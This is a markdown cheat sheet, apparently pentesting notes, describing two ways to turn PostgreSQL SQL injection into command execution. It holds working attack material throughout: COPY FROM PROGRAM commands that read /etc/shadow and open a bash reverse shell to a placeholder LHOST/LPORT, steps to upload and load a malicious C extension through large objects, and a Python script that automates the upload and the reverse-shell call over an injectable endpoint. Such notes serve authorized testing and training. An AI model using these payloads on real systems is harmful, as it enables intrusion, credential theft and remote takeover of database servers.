# Command Execution via PostgreSQL SQLi

Two methods for RCE through a PostgreSQL injection. Both require superuser or `pg_execute_server_program` role.

Check superuser: `SELECT current_setting('is_superuser');`

---

## Method 1: COPY FROM PROGRAM

Runs a shell command as the `postgres` OS user and stores output in a table:

```sql
CREATE TABLE tmp(t TEXT);
COPY tmp FROM PROGRAM 'id';
SELECT * FROM tmp;
DROP TABLE tmp;
```

Read any file on the filesystem:
```sql
COPY tmp FROM PROGRAM 'cat /etc/shadow';
```

Execute and discard output (fire-and-forget):
```sql
COPY tmp FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"';
```

**CVE-2019-9193** — PostgreSQL considers this intended functionality, not a bug.

---

## Method 2: PostgreSQL Extension (Reverse Shell)

Load a compiled C shared library as a PostgreSQL extension to spawn a reverse shell as the `postgres` user.

### Compile the extension (on attacker machine)

```bash
sudo apt install postgresql-server-dev-13
gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c
```

The source must include `PG_MODULE_MAGIC` and be compiled against the **exact major version** of the target PostgreSQL.

### Upload via large objects

```sql
SELECT lo_create(31337);
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 0, DECODE('<hex_chunk_0>','HEX'));
-- repeat for each 2KB page
SELECT lo_export(31337, '/tmp/pg_rev_shell.so');
SELECT lo_unlink(31337);
```

### Load and call

```sql
CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;
SELECT rev_shell('LHOST', LPORT);   -- hangs while shell is open
DROP FUNCTION rev_shell;
```

Note: path in `CREATE FUNCTION` omits the `.so` extension.

### Permissions for extensions

- Must be superuser, OR
- Have `CREATE` privilege on the public schema, AND
- C must be added as a trusted language (untrusted by default)

---

## Automation Script Pattern

For blind injection contexts, script the large object upload + function call:

```python
import requests, math

def sqli(q):
    # inject q via the vulnerable endpoint (e.g. signup name field stacked query)
    pass

with open("pg_rev_shell.so","rb") as f:
    raw = f.read()

loid = 55555
sqli(f"SELECT lo_create({loid});")

for pageno in range(math.ceil(len(raw)/2048)):
    page = raw[pageno*2048:pageno*2048+2048]
    sqli(f"INSERT INTO pg_largeobject (loid, pageno, data) VALUES ({loid}, {pageno}, decode('{page.hex()}','hex'));")

sqli(f"SELECT lo_export({loid}, '/tmp/pg_rev_shell.so'); SELECT lo_unlink({loid}); DROP FUNCTION IF EXISTS rev_shell; CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT; SELECT rev_shell('LHOST', LPORT);")
```

---

## Permissions Summary

| Action | Required |
|--------|----------|
| COPY FROM PROGRAM | superuser OR `pg_execute_server_program` |
| CREATE FUNCTION (C lang) | superuser (C is untrusted by default) |
| lo_create / lo_unlink | any user |
| INSERT into pg_largeobject | superuser (or explicit grant) |
